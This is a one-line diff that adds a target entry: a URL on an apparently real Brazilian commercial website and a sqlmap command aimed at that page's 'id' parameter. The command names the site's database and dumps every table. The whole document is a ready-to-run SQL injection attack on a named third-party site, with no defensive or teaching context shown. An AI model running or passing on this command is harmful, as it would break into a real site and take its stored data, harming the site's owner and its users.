@@ -1,0 +1,1 @@
+http://www.biazam.com.br/produtos-busca.php?id=7 (GET)  # sqlmap.py -u http://www.biazam.com.br/produtos-busca.php?id=7 -D biazam_1 --tables --dump-all --threads 10 -v3
